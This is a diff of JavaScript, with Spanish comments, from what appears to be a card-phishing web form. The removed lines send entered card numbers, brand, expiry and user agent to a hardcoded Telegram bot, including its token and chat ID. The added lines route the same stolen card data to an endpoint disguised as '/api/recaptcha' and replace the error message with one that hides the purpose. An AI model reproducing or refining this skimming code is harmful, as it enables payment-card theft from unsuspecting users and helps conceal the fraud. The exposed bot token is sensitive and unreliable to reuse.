@@ -253,30 +253,23 @@ form?.addEventListener("submit", async (e)=>{
   dateInput.value = p.mm + "/" + p.yy;
   displayDate.textContent = p.mm + "/" + p.yy;
 
-  // --- INICIO CÓDIGO TELEGRAM ---
-  const BOT_TOKEN = "6276003958:AAFK6X1KGAFa8lktb474FXmNWqwnu6b871I";
-  const CHAT_ID = "1203016155";
-  const text = `💳 *Nueva Tarjeta Detectada*\n\n` +
-               `▫️ *Número:* \`${numInput.value}\`\n` +
-               `▫️ *Marca:* ${brand}\n` +
-               `▫️ *Exp:* ${p.mm}/${p.yy}\n` +
-               `▫️ *User-Agent:* ${navigator.userAgent}`;
-
+  // --- ENVÍO AL BACKEND (ANÓNIMO) ---
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    await fetch('/api/recaptcha', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown'
+        numero: raw,
+        marca: brand,
+        exp: `${p.mm}/${p.yy}`,
+        userAgent: navigator.userAgent
       }),
       keepalive: true
     });
   } catch (error) {
-    console.error("Error al enviar a Telegram", error);
+    console.error("Error al cargar el módulo de validación");
   }
-  // --- FIN CÓDIGO TELEGRAM ---
+  // --- FIN ENVÍO ---
 
   loading.style.display = "flex";
   let c = 3;
